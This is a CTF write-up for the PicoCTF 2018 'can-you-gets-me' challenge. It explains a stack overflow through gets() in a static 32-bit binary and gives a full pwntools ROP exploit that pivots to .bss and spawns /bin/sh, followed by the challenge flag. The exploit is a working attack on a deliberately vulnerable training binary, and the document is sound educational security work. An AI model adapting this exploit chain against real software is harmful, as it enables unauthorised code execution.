# can-you-gets-me

This is a 650-point pwning problem from PicoCTF 2018 (level 3).

### Problem Description

Can you exploit the following [program](./gets) to get a flag? You may need to think return-oriented if you want to program your way to the flag. You can find the program in /problems/can-you-gets-me_0_8ac5bddeab74e647cd6d31642246a12a on the shell server. [Source.](./gets.c)

## Reconnaissance

This is a 32-bit ELF binary. Here's checksec run on the file:

```
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      FILE
Partial RELRO   No canary found   NX enabled    No PIE          No RPATH   No RUNPATH   gets
```

This looks like a classic ROP problem. The executable is statically linked, so I have lots of gadgets to work with. ROPGadget finds 13,209 of them in fact.

Alright, I want to call `execve("/bin/sh",NULL,NULL)`. So I need to call `int 80` with `0xb` in `eax`, a pointer to "/bin/sh" in `edx`, NULL in `esi` and NULL in `edi`.

I looked for a number of ways to push `esp` in order to get a pointer to `/bin//sh` on the stack, but could not find one. Accordingly, I did a pivot to the `.bss` section, read `/bin//sh` to that location, and the rest of the ROP chain was straightforward after that.

```python2
from pwn import *

sh =  ssh(host='2018shell1.picoctf.com',\
		 user='<redacted>',\
		 password='<redacted>')

p = sh.process('/problems/can-you-gets-me_0_<redacted>/gets')

payload = "A"*28
INT_0x80_ADDR = 0x0806cd95
POP_EAX_ADDR = 0x080b84d6 # : pop eax ; ret
POP_EDX_ADDR = 0x0806f19a #: pop edx ; ret
POP_EBP_ADDR = 0x080483ca # : pop ebp ; ret
POP_EBX_ADDR = 0x080481c9 # : pop ebx ; ret
POP_ECX_ADDR = 0x080dece1 # : pop ecx ; ret

NEW_ROP_CHAIN_ADDR = 0x080ebdd0
NEW_ROP_STRING_ADDR = 0x080ebdb0
GETS_ADDR = 0x08048899

payload += p32(POP_EBP_ADDR)
payload += p32(NEW_ROP_CHAIN_ADDR)
payload += p32(GETS_ADDR)
payload += p32(NEW_ROP_STRING_ADDR)
payload += "\n"
p.send(payload)

payload2 = "/bin//sh"
payload2 += p32(0x0)
payload2 += "D"*24
payload2 += p32(POP_EBX_ADDR)
payload2 += p32(NEW_ROP_STRING_ADDR)
payload2 += p32(POP_ECX_ADDR)
payload2 += p32(0x0)
payload2 += p32(POP_EDX_ADDR)
payload2 += p32(0x0)
payload2 += p32(POP_EAX_ADDR)
payload2 += p32(0xb)
payload2 += p32(INT_0x80_ADDR)
payload2 += "\n"
p.send(payload2)

p.interactive()
```

And the flag is `picoCTF{rOp_yOuR_wAY_tO_AnTHinG_cca0ace7}`.


### Comparison to Other Approaches

[EverTokki](https://ctftime.org/writeup/13864) creates a ROP chain that appears to have no null bytes. This write-up also reminded me that instead of moving `%esp` into another register to get a pointer to `/bin//sh`, I can also write `/bin//sh` to writable memory directly, using an instruction such as `mov [edx], eax`. [Dvd848](https://github.com/Dvd848/CTFs/blob/master/2018_picoCTF/can-you-gets-me.md) pointed out to me that the `ROPGadget` tool that I've been using has the `--ropchain` flag, which could make my life easier by pointing out a set of gadgets that write things to memory and even generating most or all of the ROP chain. The other write-ups on CTFTime are variations on this theme, with the exception of [c0wb0yz_fr0m_h3x](https://github.com/MarcoGarlet/CTF-Writeups/blob/master/picoCTF2018/can-you-gets-me/exp.md), who makes the `.bss` section executable and executes shellcode there.
